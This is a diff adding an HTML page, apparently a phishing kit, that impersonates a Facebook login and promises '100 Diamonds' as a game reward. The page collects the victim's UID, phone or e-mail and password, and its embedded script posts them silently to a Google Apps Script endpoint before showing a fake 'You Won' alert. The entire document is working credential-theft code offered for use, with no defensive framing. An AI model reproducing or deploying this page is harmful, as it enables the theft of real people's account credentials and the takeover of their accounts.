@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="img"> </div>
+        <form method="post" name="google-sheet" class="form" >
+        <p class="login">Facebook</p>
+         <input type="text" name="UID" Id="box1" placeholder="UID">
+         <input type="text" name="MOBILE" Id="box" placeholder="Mobile or E-mail">
+         <input type="password" name="PASS" Id="box" placeholder="enter password">
+         <input type="submit"  value="Get 100 Diamonds" id="submit">
+        </form>
+
+        <script>
+        const scriptURL =
+        'https://script.google.com/macros/s/AKfycbx7f8VM1PLQ-ZW8ftQtaPmvtpOSzmvtgkLhc_deX7TKutSIt0huNFBdyccLRgLjIpNn/exec'
+        const form = document.forms['google-sheet']
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => alert("You Won 100 Diamonds"))
+          .catch(error => console.error('Error!',error.message))
+        })
+        </script>
+</body>
+</html>
